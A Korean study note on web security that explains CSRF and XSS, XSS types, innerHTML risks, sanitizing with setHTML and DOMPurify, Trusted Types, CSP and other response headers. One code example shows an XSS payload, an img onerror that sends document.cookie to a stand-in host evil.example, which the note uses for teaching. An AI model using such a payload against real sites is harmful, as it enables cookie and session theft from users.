---
title: "웹 보안: CSRF와 XSS"
concept: "CSRF"
summary: "사용자의 권한을 도용하는 CSRF와 악성 스크립트를 주입하는 XSS의 원리와 방어법. 문자열 HTML을 innerHTML에 넣을 때의 위험과 setHTML·DOMPurify·Trusted Types도 다룬다."
tags: ["security", "web", "http", "django"]
source: mixed
date: "2026-10-21"
sources: ["https://ko.javascript.info/clickjacking", "https://wesbos.com/javascript/04-the-dom/html-from-strings-and-xss", "https://developer.mozilla.org/en-US/docs/Web/API/Element/setHTML", "https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API", "https://web.dev/learn/privacy/third-parties", "https://github.com/baeharam/Must-Know-About-Frontend/blob/main/Notes/security/xss-csrf.md", "https://web.dev/articles/csp", "https://web.dev/articles/strict-csp", "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP"]
---

> TIL을 정리하고, 문자열 HTML과 XSS 부분은 Wes Bos의 「Beginner JavaScript」 강의 노트(wesbos.com/javascript)를, 응답 헤더 부분은 web.dev의 「[Learn Privacy](https://web.dev/learn/privacy)」 강좌를 함께 참고했다.
> XSS 유형 구분은 「[Must-Know-About-Frontend: XSS와 CSRF](https://github.com/baeharam/Must-Know-About-Frontend/blob/main/Notes/security/xss-csrf.md)」를 바탕으로 보강했다. CSP는 web.dev의 「[Content security policy](https://web.dev/articles/csp)」, 「[Mitigate XSS with a strict CSP](https://web.dev/articles/strict-csp)」와 MDN의 「[Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP)」를 바탕으로 보강했다.

웹 애플리케이션의 대표적인 취약점 두 가지는 **CSRF**와 **XSS**다. 둘 다 "브라우저가 사용자를 대신해 무언가를 실행한다"는 점을 악용하지만, CSRF는 **요청을 위조**하고 XSS는 **스크립트를 주입**한다는 점이 다르다.

## CSRF (Cross-Site Request Forgery, 사이트 간 요청 위조)

사용자가 자신의 의지와 무관하게 공격자가 의도한 요청(수정, 삭제, 송금 등)을 보내게 만드는 공격이다.

### 원리

1. 사용자가 정상 사이트에 로그인해 세션 쿠키를 가지고 있다.
2. 공격자가 만든 페이지(또는 메일 링크)에 접속하면, 그 페이지가 정상 사이트로 요청을 보낸다.
3. 브라우저는 해당 사이트의 쿠키를 **자동으로** 실어 보내므로, 서버는 정상 사용자의 요청으로 착각한다.

### 방어: CSRF 토큰

서버가 매 요청마다 예측할 수 없는 난수 토큰을 발급해 폼에 숨겨 두고, 요청을 받을 때 토큰이 유효한지 검증한다. 공격자 페이지는 이 토큰 값을 알 수 없으므로 위조 요청이 거부된다.

- 데이터를 변경하는 `POST`, `PUT`/`PATCH`, `DELETE` 요청에 주로 적용한다.
- 쿠키의 `SameSite` 속성으로 다른 사이트에서 시작된 요청에 쿠키가 실리지 않게 하는 방법도 함께 쓴다. 크롬·엣지는 값을 생략하면 `Lax`로 다뤄 다른 사이트의 `POST`에 쿠키를 싣지 않지만, 브라우저마다 기본값이 다르므로 명시한다([[cookie-session|쿠키와 세션]]).
- 요청의 `Origin`·`Sec-Fetch-Site` 헤더로 다른 사이트에서 온 변경 요청을 거부하는 방법도 있다.

Django는 `CsrfViewMiddleware`와 폼에 숨은 입력을 넣는 `{% csrf_token %}`으로 이 방식을 처리한다 → [[auth-user|Django User와 인증]].

## XSS (Cross-Site Scripting)

공격자가 입력창(`<input>`, 게시글 등)을 통해 웹 페이지에 **악성 스크립트를 삽입**하는 공격이다. 다른 사용자의 브라우저가 그 스크립트를 실행하면서 쿠키 탈취, 사용자 사칭, 접근 제어 우회 등이 일어난다.

스크립트가 페이지에 들어가는 경로에 따라 세 갈래로 나눈다.

| 유형 | 스크립트가 있는 곳 | 퍼지는 방식 | 예 |
| --- | --- | --- | --- |
| 저장(stored) XSS | 서버 DB | 그 페이지를 여는 **모든 사용자**가 실행한다 | 게시글·댓글·프로필에 넣은 `<img onerror>` |
| 반사(reflected) XSS | 요청 URL | 서버가 입력을 응답 HTML에 그대로 되돌려 준다. 악성 링크를 누른 사용자만 당한다 | `?q=<script>…`를 「검색 결과 없음: …」에 그대로 출력 |
| DOM 기반 XSS | 요청 URL·`location.hash` 등 | 서버를 거치지 않고 **클라이언트 JS**가 값을 위험한 지점(sink)에 넣는다 | `el.innerHTML = location.hash.slice(1)` |

저장·반사형은 서버의 출력 이스케이프로, DOM 기반은 프론트엔드 코드에서 아래 「문자열로 HTML을 만들 때」의 규칙으로 막는다.

### 문자열로 HTML을 만들 때

템플릿 리터럴로 HTML을 만들어 `innerHTML`에 넣는 코드는 짧고 편하다. 하지만 끼워 넣은 값이 사용자 입력이면 그 값도 HTML로 해석된다.

```javascript
const desc = '귀여운 강아지 <img src="x" onerror="fetch(`//evil.example?c=${document.cookie}`)">'
card.innerHTML = `<h2>${desc}</h2>` // onerror가 실행된다
```

- `innerHTML`로 넣은 `<script>` 태그는 실행되지 않는다. 그래서 안전하다고 착각하기 쉽지만, `onerror`·`onload` 같은 **이벤트 속성**과 `javascript:` URL은 그대로 동작한다. `<style>`만 넣어도 페이지 전체를 숨기거나 가짜 화면을 덮을 수 있다.
- 같은 위험을 가진 지점(sink)은 `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `createContextualFragment`, `document.write`, 그리고 React의 `dangerouslySetInnerHTML`이다.
- 텍스트만 필요하면 `textContent`나 `createElement` + `textContent`로 만든다([[dom-manipulation|DOM 조작]]).
- HTML을 허용해야 하면 정제(sanitize)한다. 표준 **`Element.setHTML()`**(HTML Sanitizer API)은 문자열을 파싱하면서 스크립트·이벤트 속성 같은 위험 요소를 항상 제거한다. 크롬 146·파이어폭스 148부터 지원하고 2026년 10월 기준 사파리는 지원하지 않으므로, 기능 감지 후 없으면 **DOMPurify**로 정제해 넣는다. 이름이 비슷한 `setHTMLUnsafe()`는 정제하지 않는다.
- **Trusted Types**(CSP의 `require-trusted-types-for 'script'`)를 켜면 위 sink에 일반 문자열을 넣는 코드가 아예 오류가 된다. 크롬 83, 사파리 26, 파이어폭스 148부터 지원해 주요 브라우저에서 모두 쓸 수 있다.

### 방어

- 사용자 입력을 HTML로 그대로 삽입하지 않는다. JavaScript에서는 `innerHTML` 대신 `textContent`를 쓴다.
- 출력 시 HTML 이스케이프 처리를 한다. React·Django 템플릿은 기본적으로 이스케이프한다(React의 `dangerouslySetInnerHTML`은 예외이므로 주의).
- 세션 쿠키에 `HttpOnly` 속성을 주어 스크립트에서 읽지 못하게 한다.
- **CSP(Content Security Policy)** 헤더로 실행할 수 있는 스크립트의 출처를 제한한다. 인라인 스크립트를 막고 nonce·hash가 맞는 스크립트만 허용하면, 주입된 스크립트가 있어도 실행되지 않는다.
- 사용자가 쓴 HTML(리치 텍스트)을 보여 줘야 하면 `setHTML()`이나 DOMPurify로 정제한다.
- `localStorage`도 같은 출처의 스크립트가 모두 읽으므로, XSS가 나면 그 안의 토큰이 함께 새어 나간다([[web-storage|Web Storage]]).

### CSP: 실행할 수 있는 것을 응답 헤더로 정한다

**CSP(Content Security Policy)는 페이지가 어디서 온 스크립트·스타일·이미지·프레임을 불러오고 실행할 수 있는지를 서버가 응답 헤더로 선언하는 장치다.** 이스케이프가 한 곳에서 새더라도 주입된 스크립트가 실행되지 않게 막는 2차 방어선이다.

```http
Content-Security-Policy: default-src 'self'; img-src 'self' https://cdn.example.com; object-src 'none'; frame-ancestors 'none'
```

| 지시어 | 정하는 것 |
| --- | --- |
| `default-src` | 따로 적지 않은 리소스 종류의 기본값 |
| `script-src`, `style-src`, `img-src`, `font-src`, `connect-src`(fetch·WebSocket), `frame-src` | 종류별 허용 출처 |
| `object-src 'none'` | 플러그인(`<object>`·`<embed>`)을 막는다 |
| `base-uri 'none'` | `<base>` 태그를 주입해 상대 경로 스크립트를 공격자 서버로 돌리는 것을 막는다 |
| `frame-ancestors` | 이 페이지를 iframe에 넣을 수 있는 출처. 클릭재킹 방어. `default-src`로 대신 정해지지 않고 `<meta>`로는 설정할 수 없다 |
| `upgrade-insecure-requests` | 페이지 안의 `http://` 하위 리소스 요청을 `https://`로 올린다 |
| `report-to` | 위반 보고를 받을 끝점(`Reporting-Endpoints` 헤더에 정의). 예전 `report-uri`는 폐기 예정이지만 호환을 위해 함께 쓴다 |

**출처 허용 목록만으로는 약하다.** 허용한 CDN에 JSONP 엔드포인트나 오래된 라이브러리가 있으면 그것을 통해 우회된다. 그래서 지금 권장하는 형태는 출처 대신 **nonce나 hash로 스크립트 하나하나를 허용하는 strict CSP**다.

```http
Content-Security-Policy: script-src 'nonce-R4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'
```

- 서버는 **응답마다 새 무작위 nonce**를 만들어 헤더와 `<script nonce="R4nd0m">`에 같이 넣는다. 주입된 스크립트는 nonce를 모르므로 실행되지 않는다. 정적 페이지라 nonce를 못 넣으면 스크립트 내용의 해시(`'sha256-…'`)를 쓴다.
- `'strict-dynamic'`은 nonce로 허용된 스크립트가 동적으로 추가한 스크립트도 믿는다. 번들러가 청크를 불러오는 코드가 깨지지 않는다.
- `'unsafe-inline'`과 `'unsafe-eval'`은 CSP의 효과를 거의 없앤다. 인라인 이벤트 속성(`onclick="…"`)과 `eval()`·`new Function()`·문자열 `setTimeout`을 코드에서 없애야 CSP를 켤 수 있다.
- 처음에는 `Content-Security-Policy-Report-Only`로 막지 않고 위반만 모아, 깨질 곳을 고친 뒤 강제로 바꾼다.
- `<meta http-equiv="Content-Security-Policy">`로도 걸 수 있지만 `frame-ancestors`, `report-uri`, `sandbox`는 헤더로만 된다.

## 클릭재킹(Clickjacking)

클릭재킹의 원리와 방어(`frame-ancestors`, `X-Frame-Options`)는 [[windows-and-frames#클릭재킹: 남의 iframe에 갇힌 내 페이지|창과 프레임]]에 정리했다.

프레임 사이 통신을 쓸 때 `postMessage`를 받는 쪽이 `event.origin`을 검사하지 않으면, 아무 사이트나 메시지를 보내 DOM을 조작하게 되어 XSS 통로가 된다. 창·프레임 관계와 sandbox는 [[windows-and-frames|창과 프레임: 팝업, iframe, postMessage]]에 있다.

## 비교

| 구분 | CSRF | XSS |
| --- | --- | --- |
| 공격 방식 | 사용자 권한으로 위조 요청을 보내게 함 | 페이지에 악성 스크립트를 삽입 |
| 악용하는 점 | 브라우저가 쿠키를 자동 전송 | 사이트가 입력을 검증 없이 출력 |
| 대표 방어 | CSRF 토큰, `SameSite` 쿠키, `Origin` 검사 | 출력 이스케이프, `innerHTML` 지양, CSP, `HttpOnly` 쿠키 |

## 함께 거는 응답 헤더

CSRF·XSS 방어 말고도 응답 헤더로 페이지가 할 수 있는 일의 범위를 좁힌다. 서드파티를 묶는 쪽의 자세한 설명은 [[third-party-privacy|서드파티와 프라이버시]]에 있다.

| 헤더 | 막는 것 |
| --- | --- |
| `Content-Security-Policy` | 허용하지 않은 출처의 스크립트 실행. `-Report-Only`로 막지 않고 위반만 보고받아 예상 밖 서드파티를 감시할 수 있다 |
| `Referrer-Policy` | 경로·쿼리에 담긴 정보가 `Referer`로 다른 사이트에 새는 것. 기본값 `strict-origin-when-cross-origin`을 명시하거나 더 좁힌다 |
| `Permissions-Policy` | 페이지와 iframe이 카메라·위치 같은 강력한 기능을 쓰는 것. 기본 거부 후 필요한 것만 연다 |
| `Strict-Transport-Security` | HTTP로의 다운그레이드([[https\|HTTPS와 TLS]]) |
| `Clear-Site-Data` | 로그아웃 뒤 브라우저에 남는 쿠키·저장소·캐시 |

## 핵심 정리

- CSRF는 "사용자가 원치 않은 요청"을, XSS는 "사이트가 원치 않은 스크립트"를 실행시킨다.
- CSRF는 서버가 발급한 토큰으로, XSS는 입력을 HTML로 해석하지 않는 것으로 막는다.

관련 노트: [[security|정보 시스템 보안(공격 기법과 암호)]], [[cookie-session|쿠키와 세션]], [[third-party-privacy|서드파티와 프라이버시]], [[cors|CORS]], [[oauth2|OAuth 2.0]], [[https|HTTPS와 TLS]], [[api-security|API 보안 체크리스트]], [[regexp-engine|정규식 엔진: 탐욕·게으름·전후방탐색·백트래킹]]
